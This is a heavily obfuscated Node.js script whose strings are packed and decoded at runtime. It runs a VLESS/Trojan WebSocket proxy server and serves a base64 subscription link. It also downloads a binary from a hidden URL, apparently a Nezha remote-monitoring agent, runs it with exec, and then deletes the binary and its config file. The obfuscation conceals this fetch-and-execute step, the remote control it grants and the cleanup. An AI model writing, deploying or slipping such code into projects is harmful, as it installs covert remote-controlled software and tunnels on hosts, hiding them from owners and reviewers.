(function(g){var A,e,k,W;function O(T,Z){return T<<Z}function P(T,Z){return T>>Z}function N(T,Z){return T<=Z}function o(T,Z){return T%Z}function h(T,Z){return T*Z}function n(T,Z){return T+Z}function B(T,Z){return T-Z}function t(T,Z){return T/Z}function f(T,Z){return T<Z}function J(T,Z){return T>Z}function Q(T,Z){return T>=Z}function y(T,Z,W){return T[Z]=W,T}k=y;let T=k(k(k(k(k({},'k','obje'),'Y','ct'),'F','object'),'W',!0),'n','_$a');A=Object.assign;W=JSON.parse;let r=['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'],x,F=String.fromCharCode,E=Uint8Array,G=Uint16Array,R=Uint32Array;e=typeof window===n(T.k,T.Y)&&window||typeof self===n(T.k,'ct')&&self||exports||typeof globalThis===n('obje',T.Y)&&globalThis||typeof global===T.F&&global;let Z=(function(Z){var N,B,h,W,A;N=y;let T=(()=>'atob'.split('|'))();((((W='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')&&0||(h=function(W){var Z,T,F;let h=N(N({},'k',0),'Y','charAt');for(((T={})||1)&&(Z=h.k)&&0||(F=W.length);f(Z,F);Z++)T[W[h.Y](Z)]=Z;return T}(W)))&&false||(A=function(W){var Z,N,T,A;function B(){return['length',4,0,'charAt',18,1,12,'At',3,16,255,'th',2,'join']}let t=B();return(T=W[t[0]])&&0||(A=o(T,t[1]),N=(J(T,t[2])?O(h[W[t[3]](0)],t[4]):0)|(J(T,t[5])?O(h[W.charAt(t[5])],t[6]):0)|(J(T,2)?O(h[W.charAt(2)],6):t[2])|(J(T,3)?h[W[n('char',t[7])](t[8])]:0),Z=[F(N>>>t[9]),F(N>>>8&t[10]),F(N&255)],Z[n('leng',t[11])]-=[t[2],0,t[12],1][A],Z[t[13]](''))}))&&0||(B=function(T){return T.replace(/\S{1,4}/g,A)})||'1')&&N(Z,T[0],function(Z){const T=['replace',''];return B(String(Z)[T[0]](/[^A-Za-z0-9\+\/]/g,T[1]))})}(e),function(g){var i,q,W,T1,s,m,j,e,V,b,C,x,I,d,X,a,T,Z,w,D,M,H,L,S,l;function K(){return k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k(k({},'k',8),'Y',0),'F','p'),'W','type'),'n',1),'d','K'),'r','I'),'J','prototype'),'Q','J'),'u','undefined'),'o',16),'V',18),'j',7),'L',6),'H',10),'e',4),'S',2),'D',3),'q',9),'I',11),'f',13),'X',15),'x',17),'_',19),'G',23),'s',43),'A',59),'y',67),'t',83),'h',195),'$',258),'C',5),'w',33),'a',193),'Z',257),'T',513),'K',3073),'E',24577),'O',288),'v',255),'U','d')}const U=K();((V=U.k)&&0||(a=!0))&&0||(Z=void U.Y);function v(T){throw T}function u(W,N){var Z,F,B,h;B=y;function T(){return'index|c|verify|N|method|err:|bufferSize|bufferType'.split('|')}let A=T();Z=this;(h=void 0,B(B(Z,n('inp','ut'),W),'c',0),N||!(N={}))&&((N[A[0]]&&(Z[A[1]]=N.index)||'0')&&(N[A[2]]&&(Z[A[3]]=N.verify)));(F=W[Z[A[1]]++])&&0||(h=W[Z.c++]);switch(F&15){case V:Z[A[4]]=V}(0!==o(n(O(F,8),h),31)&&v(Error(n(A[5],o(n(O(F,8),h),31))))||5)&&(h&32&&v(Error('not')))&&0||B(Z,'B',new c(W,B(B(B(B({},A[0],Z.c),'bufferSize',N[A[6]]),A[7],N[A[7]]),'resize',N[n('resi','ze')])))}(i=(u[n('proto',U.W)][U.F]=function(){var F,T,Z,h,A;A=y;const W=(()=>'input|p|B|c|N'.split('|'))();return((T=this)&&0||(Z=T[W[0]]))&&0||(F=void 0,h=void 0,F=T[W[2]][W[1]](),A(T,'c',T.B[W[3]]),T[W[4]]&&(h=(O(Z[T.c++],24)|O(Z[T[W[3]]++],16)|O(Z[T.c++],8)|Z[T.c++])>>>0,h!==jb(F)&&v(Error('i32c'))),F)},0))&&0||(X=U.n);function c(W,h){var Z,F;F=y;let T=(()=>[32768,'g','c','q',0,'input','s',!1,'C','index','m','resi','resize','a','b','f','t','o'])();Z=this;(F(F(F(F(F(F(F(Z,'l',[]),'m',T[0]),'e',Z[T[1]]=Z[T[2]]=Z[T[3]]=T[4]),T[5],l?new E(W):W),T[6],T[7]),'n',X),T[8],!1),h||!(h={}))&&(((h[T[9]]&&(Z[T[2]]=h[T[9]])||3)&&(h.bufferSize&&(Z[T[10]]=h.bufferSize))&&0||h.bufferType&&(Z.n=h.bufferType)||1)&&(h[n(T[11],'ze')]&&(Z.C=h[T[12]])));switch(Z.n){case i:Z.b=T[0];Z[T[13]]=new(l?E:Array)(n(n(T[0],Z[T[10]]),258));break;case X:Z[T[14]]=T[4];Z.a=new(l?E:Array)(Z[T[10]]);Z[T[15]]=Z.K;Z[T[16]]=Z.I;Z[T[17]]=Z.J;break;default:v(Error('imd'))}}((c[n('proto','type')][U.d]=function(N){var r,W,G,F,T,Z,R,A;let y=['length','input','c',0,'number','v','numb','G',2,258,'th','a'];return(W=this)&&0||(F=n(t(W[y[1]][y[0]],W[y[2]]),1)|y[3],T=void y[3],r=void y[3],G=void 0,Z=W.input,A=W.a,N&&(y[4]===typeof N[y[5]]&&(F=N[y[5]]),n(y[6],'er')===typeof N[y[7]]&&(F+=N[y[7]])),J(2,F)?(T=t(B(Z.length,W.c),W.u[y[8]]),G=h(y[9],t(T,y[8]))|y[3],r=f(G,A[n('leng',y[10])])?n(A[n('leng','th')],G):O(A[y[0]],1)):r=h(A[y[0]],F),l?(R=new E(r),R.set(A)):R=A,W[y[11]]=R)})&&null||(c[U.J][U.r]=function(){var T,W,Z;const h=(()=>'length|a|C|subarray'.split('|'))();return(T=this)&&0||(W=T.b,l?T[h[2]]?(Z=new E(W),Z.set(T.a[h[3]](0,W))):Z=T.a[n('subar','ray')](0,W):(J(T.a[h[0]],W)&&(T[h[1]][h[0]]=W),Z=T.a),T.buffer=Z)}))&&false||(c.prototype[U.Q]=function(O,R){var G,A,k,E,Z,t,g,h,e;E=y;function r(){return'u|length|e'.split('|')}let F=r();for((((e=this)&&0||(h=e.a))&&0||(k=e.b)||8)&&E(e,F[0],O)&&0||(A=h[F[1]]);256!==(G=$(e,O));)if(J(256,G)){Q(k,A)&&(h=e.f(),A=h[F[1]])&&0||(h[k++]=G)}else{for((((((Z=B(G,257))&&0||(t=W[Z]))&&0||f(0,D[Z])&&(t+=Y(e,D[Z]))||true)&&(G=$(e,R))||1)&&(g=T[G])||'1')&&(f(0,x[G])&&(g+=Y(e,x[G])))&&false||J(n(k,t),A)&&(h=e.f(),A=h[n('leng','th')]);t--;)h[k]=h[B(k++,g)]}for(;N(8,e[F[2]]);)e[F[2]]-=8,e.c--;E(e,'b',k)});function A(h){var e,G,Q,p,k,T,F,Z,B,W,x,E,g,t,y,A;(((E=-231)||3)&&(Q=327)||1)&&(G={J:-231,u:-329,i:-68,C:0,P:-90,e:'INFINITY',t:function(){return(G.b==-231?void 0:f)(E==E+(G.n=='o'?G.p:133)||x,G.r=t)},m:function(){return x=0},f:1,b:'length',n:327,c:0,d:'POSITIVE_',h:function(){return(E==E+136?G:h)[G.b]},g:()=>Q==92});while(E+Q!=66)r:switch(E+Q){case E!=-234&&(E!=-261&&(E!=-269&&(E!=-256&&(E!=-227&&E- -327)))):if(G.g()){E-=25;break r}t=G.h();W=G.c;k=(G.l=Number)[(G.c==0&&n)((Q==G.i?Q:G).d,G.e)];for(G.m();G.t();++x)J((G.n=='w'||h)[G.v=x],W)&&(W=(G.e=='INFINITY'&&h)[E==-231&&x]),f((E==-231&&h)[E==-231&&x],G.b=='y'||k)&&(k=h[x]);for(A=(F=(Q==327&&O)(G.f,E==92?NaN:W),y=new(((G.hasOwnProperty('u'))?l:E)?G.d==14?Infinity:R:Array)(F),T=1,g=G.C,2);(Q==327&&N)(T,W);){for(x=G.c;f(G.E=x,Q==327&&t);++x)if(h[G.F=x]===(G.G=T)){for(p=(B=0,Z=Q==87||g,(Q==55||G).c);f(G.I=p,T);++p)B=O(G.C==-231||B,(E==G.J&&G).f)|(G.f=='L'?void 0:Z)&(typeof G.i=='string'?void 0:G).f,Z>>=(G.O=G).f;for(p=(e=O(T,16)|x,B);f(G.R=p,F);p+=G.S=A)y[p]=E==-231&&e;++g}(++T&&0||(g<<=1)||6)&&(A<<=G.f)}return[Q==327?y:G,G.U=W,G.P==-44?Q:k]}}function $(R,N){var J,T,Z,h,k,t,W,G,F,A;J=y;let r=J(J(J(J(J(J(J(J({},'k','g'),'Y','ut'),'F','length'),'W',0),'n',8),'d',1),'r','e'),'J','c');for((((((W=R[r.k])||3)&&(t=R.e)||1)&&(Z=R[n('inp',r.Y)])&&0||(k=R.c)||3)&&(T=Z[r.F])&&0||(F=N[r.W])||1)&&(G=N[1]);f(t,G)&&!Q(k,T);)W|=O(Z[k++],t),t+=r.n;return A=F[W&B(O(1,G),r.d)],h=A>>>16,J(J(J(R,r.k,P(W,h)),r.r,B(t,h)),r.J,k),A&65535}function r(O){var Z,N,T,R,B,F,W,h,G;G=y;const t=(()=>[5,4,0,3,'length'])();function r(N,A,h){var B,t,F,T,W,Z;t=y;let O=t(t(t(t(t(t({},'k',3),'Y',16),'F',17),'W',7),'n',0),'d',18);(W=this)&&0||(T=W.z);for(Z=0;f(Z,N);)switch(F=$(W,A),F){case O.Y:for(B=n(O.k,Y(W,2));B--;)h[Z++]=T;break;case O.F:for(B=n(O.k,Y(W,3));B--;)h[Z++]=0;T=0;break;case O.d:for(B=n(11,Y(W,O.W));B--;)h[Z++]=O.n;T=O.n;break;default:T=h[Z++]=F}return t(W,'z',T),h}((((h=n(Y(O,t[0]),257))&&0||(T=n(Y(O,5),1))||3)&&(N=n(Y(O,4),t[1]))||2)&&(R=new(l?E:Array)(d[n('leng','th')]))&&false||(F=void 0))&&null||(B=void 0);for(W=t[2];f(W,N);++W)R[d[W]]=Y(O,t[3]);if(!l){for(N=(W=N,R[t[4]]);f(W,N);++W)R[d[W]]=0}((((Z=A(R))&&0||(F=new(l?E:Array)(h)))&&0||(B=new(l?E:Array)(T)))&&0||G(O,'z',0)||true)&&O.o(A(r.call(O,h,Z,F)),A(r.call(O,T,Z,B)))}function Y(F,t){var W,r,h,A,R,Z,T;R=y;let N=R(R(R(R(R({},'k','g'),'Y','input'),'F','c'),'W','bk'),'n',1);for((((W=F[N.k])&&0||(T=F.e)||8)&&(A=F[N.Y])&&0||(r=F[N.F]))&&0||(Z=A.length);f(T,t);)Q(r,Z)&&v(Error(N.W)),W|=O(A[r++],T),T+=8;return h=W&B(O(N.n,t),1),R(R(R(F,N.k,W>>>t),'e',B(T,t)),N.F,r),h}((((((S=(c.prototype[U.F]=function(){var F,R,y,h,A,W,T,N,t,e,g;let G='s|a|e|ih|ib|th|subarray|f|im|n|c|o'.split('|');for(A=this;!A[G[0]];){(((t=Y(A,3))||5)&&(t&1&&(A[G[0]]=a))||6)&&(t>>>=1);switch(t){case 0:e=A.input;F=A.c;T=A[G[1]];R=A.b;g=e.length;W=Z;N=Z;y=T.length;h=Z;A[G[2]]=A.g=0;Q(n(F,1),g)&&v(Error('iL'));W=e[F++]|O(e[F++],8);Q(n(F,1),g)&&v(Error('iN'));N=e[F++]|O(e[F++],8);W===~N&&v(Error(G[3]));J(n(F,W),e.length)&&v(Error(G[4]));switch(A[G[9]]){case i:for(;J(n(R,W),T[n('leng',G[5])]);){if(h=B(y,R),W-=h,l){((T.set(e[G[6]](F,n(F,h)),R)||'0')&&(R+=h)||9)&&(F+=h)}else{for(;h--;)T[R++]=e[F++]}(((A.b=R)||true)&&(T=A[G[7]]())||'1')&&(R=A.b)}break;case X:for(;J(n(R,W),T.length);)T=A.f(k({},'v',2));break;default:v(Error(G[8]))}if(l){(T.set(e[G[6]](F,n(F,W)),R)&&false||(R+=W))&&0||(F+=W)}else{for(;W--;)T[R++]=e[F++]}A[G[10]]=F;A.b=R;A[G[1]]=T;break;case 1:A[G[11]](L,w);break;case 2:r(A);break;default:v(Error(n('e: ',t)))}}return z(A.t())},U.u))&&0||(l=S!==typeof E&&S!==typeof G&&S!==typeof R&&S!==typeof DataView))&&0||(d=(C=[U.o,17,U.V,0,8,U.j,9,U.L,U.H,5,11,U.e,12,3,13,U.S,14,U.n,15],l?new G(C):C)))&&0||(W=(e=[U.D,4,5,U.L,7,8,U.q,10,U.I,U.f,U.X,U.x,U._,U.G,27,31,35,U.s,51,U.A,U.y,U.t,99,115,131,163,U.h,227,U.$,U.$,U.$],l?new G(e):e))||6)&&(D=(q=[U.Y,U.Y,0,0,0,0,U.Y,0,U.n,1,1,1,U.S,U.S,2,2,3,U.D,3,3,4,U.e,U.e,U.e,U.C,U.C,5,U.C,U.Y,0,0],l?new E(q):q))||3)&&(T=(m=[1,U.S,3,U.e,U.C,U.j,9,13,17,25,U.w,49,65,97,129,U.a,U.Z,385,U.T,769,1025,1537,2049,U.K,4097,6145,8193,12289,16385,U.E],l?new G(m):m))||'0')&&(x=(s=[U.Y,U.Y,U.Y,U.Y,1,U.n,U.S,U.S,3,3,4,U.e,U.C,5,6,U.L,7,U.j,U.k,8,9,9,10,10,U.I,11,12,12,13,13],l?new E(s):s))&&0||(I=new(l?E:Array)(U.O));for(b=(b=void 0,j=U.Y,I.length);f(j,b);++j)I[j]=Q(143,j)?U.k:Q(U.v,j)?U.q:Q(279,j)?7:8;(L=A(I))&&0||(T1=new(l?E:Array)(30));for(H=(H=void U.Y,M=0,T1[n('leng','th')]);f(M,H);++M)T1[M]=5;w=A(T1);function z(W){var T,B,Z,A,t,h;function N(){return''.split('|')}const r=N();(((A=void 0)&&0||(T=r[0]))&&false||(A=W.length))&&false||(Z=0);while(f(Z,A)){B=W[Z++];switch(P(B,4)){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:T+=F(B);break;case 12:case 13:t=W[Z++];T+=F(O(B&31,6)|t&63);break;case 14:t=W[Z++];h=W[Z++];T+=F(O(B&15,12)|O(t&63,6)|O(h&63,0))}}return T}g[U.U]=function(T){let Z=new u(new E(g.atob(T).split('').map(T=>T.charCodeAt(0))),{}),W=Z.p();return W}}(e),x=typeof globalThis===n(T.k,'ct')&&globalThis||typeof window===n('obje',T.Y)&&window||typeof self==='object'&&self||typeof global===T.F&&global,T.W);for(let T of r)(T=e.d(T),T=W(T),Z)?A(x,T):(x.StringExtract=T)&&0||A(x,T);for(let Z=0;f(Z,g.length);Z++)x[n(T.n,Z)]&&A(x,k({},x[n(T.n,Z)],g[Z]))}([parseInt,encodeURIComponent,{UOmUYT:26},'cqNPACjAR',console.error,K=>{return K},console.log]));const os=require(Gbc),http=require(lbc),fs=require(mbc),axios=require(ubc),net=require(kbc),path=require(Dbc),crypto=require(Ebc),$vX3vz1=require(abc),Buffer=$vX3vz1[Abc],$vp7pLC=require(ybc),exec=$vp7pLC[Pbc],execSync=$vp7pLC[Wbc],$v2JKpX=require(ebc),WebSocket=$v2JKpX[Xbc],createWebSocketStream=$v2JKpX[Ubc],UUID=process[vbc][nbc]||obc,NEZHA_SERVER=process[vbc][xbc]||'',NEZHA_PORT=process[vbc][sbc]||'',NEZHA_KEY=process[vbc][Rbc]||'',DOMAIN=process[vbc][Mbc]||Jbc,AUTO_ACCESS=process[vbc][bbc]||!1,WSPATH=process[vbc][dbc]||UUID[hbc](pbc,Hbc),SUB_PATH=process[vbc][zbc]||rbc,NAME=process[vbc][wbc]||'',PORT=process[vbc][ibc]||Qbc;let ISP='';const GetISP=async()=>{try{const h=await axios.get(Zcc),J=h[tcc];ISP=(J[Vcc]+Hcc+J[pcc])[Kcc](/ /g,'_')}catch(h){ISP=Tbc}};GetISP();const httpServer=http[Qcc]((J,h)=>{if(J[_cc]==='/'){const J=path[lcc](__dirname,mcc);fs[ucc](J,kcc,(J,D)=>{if(J){h[Scc](gbc,{[Icc]:Dcc}),h[Occ](Ecc);return}h[Scc](gbc,{[Icc]:Dcc}),h[Occ](D)});return}else{if(J[_cc]===gcc+SUB_PATH){const q=NAME?NAME+Hcc+ISP:ISP,R=Ncc+UUID+Ccc+DOMAIN+Fcc+DOMAIN+Bcc+WSPATH+Lcc+q,F=jcc+UUID+qcc+DOMAIN+Fcc+DOMAIN+Bcc+WSPATH+Lcc+q,D=R+'\n'+F,J=Buffer[ccc](D)[fcc](Gcc);h[Scc](gbc,{[Icc]:Ycc}),h[Occ](J+'\n')}else{h[Scc](_bc,{[Icc]:Ycc}),h[Occ]($cc)}}}),wss=new WebSocket[acc]({[Acc]:httpServer}),uuid=UUID[Kcc](/-/g,''),DNS_SERVERS=[ycc,Pcc];function resolveHost(h){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[Wcc](h)){resolve(h);return}let D=pbc;function J(){if(D>=DNS_SERVERS[ecc]){reject(new Error(Xcc+h+Ucc));return}const F=DNS_SERVERS[D];D++;const q=ncc+Zbc(h)+vcc;axios.get(q,{[scc]:Sbc,[Jcc]:{[Mcc]:Rcc}})[xcc](D=>{const h=D[tcc];if(h[bcc]===pbc&&h[dcc]&&h[dcc][ecc]>pbc){const J=h[dcc][hcc](h=>h[zcc]===Ybc);if(J){resolve(J[tcc]);return}}J()})[occ](h=>((J()),void 0))}J()})}function handleVlessConnection(u,h){var J=hbc,r=Ybc;const [F]=h,T=h[J](r,Ibc);if(!T[rcc]((h,J)=>h==tbc(uuid[wcc](J*Obc,Obc),$bc))){return!1}let i=h[J](Ibc,Nbc)[icc]()+Cbc;const q=h[J](i,i+=Obc)[Tcc](pbc),D=h[J](i,i+=r)[icc](),R=D==r?h[J](i,i+=Bbc)[lcc]('.'):D==Obc?new TextDecoder()[V6c](h[J](i+r,i+=r+h[J](i,i+r)[icc]())):D==Fbc?h[J](i,i+=$bc)[t6c]((D,J,q,h)=>q%Obc?D[K6c](h[hbc](q-Ybc,q+Ybc)):D,[])[Z6c](h=>h[Tcc](pbc)[fcc]($bc))[lcc](':'):'';u[p6c](new Uint8Array([F,pbc]));const M=createWebSocketStream(u);resolveHost(R)[xcc](J=>((net[Q6c]({[_6c]:J,[g6c]:q},function(){this[S6c](h[hbc](i)),M[H6c](I6c,()=>{})[Y6c](this)[H6c](I6c,()=>{})[Y6c](M)})[H6c](I6c,()=>{})),void 0))[occ](J=>((net[Q6c]({[_6c]:R,[g6c]:q},function(){this[S6c](h[hbc](i)),M[H6c](I6c,()=>{})[Y6c](this)[H6c](I6c,()=>{})[Y6c](M)})[H6c](I6c,()=>{})),void 0));return!0}function handleTrojanConnection(q,h){var D=hbc,J=Ybc;try{if(h[ecc]<Lbc){return!1}const u=h[D](pbc,jbc)[fcc](),F=[UUID];let i=null;for(const h of F){const J=crypto[N6c](C6c)[$6c](h)[O6c](F6c);if(J===u){i=h;break}}if(!i){return!1}let offset=jbc;if(h[offset]===qbc&&h[offset+J]===fbc){offset+=Obc}const G=h[offset];if(G!==J){return!1}offset+=J;const M=h[offset];offset+=J;let T,R;if(M===J){T=h[D](offset,offset+Bbc)[lcc]('.'),offset+=Bbc}else{if(M===Fbc){const q=h[offset];offset+=J,T=h[D](offset,offset+q)[fcc](),offset+=q}else{if(M===Bbc){T=h[D](offset,offset+$bc)[t6c]((D,J,q,h)=>q%Obc?D[K6c](h[hbc](q-Ybc,q+Ybc)):D,[])[Z6c](h=>h[Tcc](pbc)[fcc]($bc))[lcc](':'),offset+=$bc}else{return!1}}}R=h[Tcc](offset),offset+=Obc;if(offset<h[ecc]&&h[offset]===qbc&&h[offset+J]===fbc){offset+=Obc}const r=createWebSocketStream(q);resolveHost(T)[xcc](J=>((net[Q6c]({[_6c]:J,[g6c]:R},function(){if(offset<h[ecc]){this[S6c](h[hbc](offset))}r[H6c](I6c,()=>{})[Y6c](this)[H6c](I6c,()=>{})[Y6c](r)})[H6c](I6c,()=>{})),void 0))[occ](J=>((net[Q6c]({[_6c]:T,[g6c]:R},function(){if(offset<h[ecc]){this[S6c](h[hbc](offset))}r[H6c](I6c,()=>{})[Y6c](this)[H6c](I6c,()=>{})[Y6c](r)})[H6c](I6c,()=>{})),void 0));return!0}catch(F){return!1}}wss[H6c](B6c,(h,D)=>{const J=D[_cc]||'';h[L6c](j6c,J=>{if(J[ecc]>Ibc&&J[pbc]===pbc){const D=J[hbc](Ybc,Ibc),q=D[rcc]((h,J)=>h==tbc(uuid[wcc](J*Obc,Obc),$bc));if(q){if(!handleVlessConnection(h,J)){h[q6c]()}return}}if(!handleTrojanConnection(h,J)){h[q6c]()}})[H6c](I6c,()=>{})});const getDownloadUrl=()=>{const h=os[f6c]();return h===c6c||h===G6c||h===l6c?!NEZHA_PORT?D6c:k6c:!NEZHA_PORT?u6c:m6c},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const D=getDownloadUrl(),h=await axios({[E6c]:'get',[_cc]:D,[A6c]:a6c}),J=fs[y6c](P6c);h[tcc][Y6c](J);return new Promise((resolve,reject)=>((J[H6c](W6c,()=>((Kbc(e6c)),(exec(X6c,h=>{if(h){reject(h)}resolve()})),void 0))),(J[H6c](I6c,reject)),void 0))}catch(h){throw h}},runnz=async()=>{try{const status=execSync(U6c,{[v6c]:n6c});if(status[o6c]()!==''){Kbc(x6c);return}}catch(J){}await downloadFile();let q='',h=[s6c,R6c,M6c,J6c,b6c,d6c];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const J=h[z6c](NEZHA_PORT)?_vc:'';q=gvc+NEZHA_SERVER+Svc+NEZHA_PORT+Yvc+NEZHA_KEY+Ivc+J+Ovc}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const D=NEZHA_SERVER[z6c](':')?NEZHA_SERVER[w6c](':')[r6c]():'',J=h[z6c](D)?T6c:i6c,q=Zvc+NEZHA_KEY+tvc+NEZHA_SERVER+Kvc+J+Vvc+UUID;fs[pvc](Hvc,q)}q=Qvc}else{Kbc(h6c);return}}try{exec(q,{[Cvc]:Nvc},h=>{if(h){Vbc(Bvc,h)}else{Kbc(Fvc)}})}catch(D){Vbc($vc+D)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const h=Lvc+DOMAIN+gcc+SUB_PATH;try{const J=await axios[jvc](qvc,{[_cc]:h},{[Jcc]:{[Icc]:fvc}});Kbc(cvc)}catch(J){}}const delFiles=()=>((fs[Gvc](P6c,()=>{})),(fs[Gvc](Hvc,()=>{})),void 0);httpServer[lvc](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),cbc)),(addAccessTask()),(Kbc(mvc+PORT)),void 0))
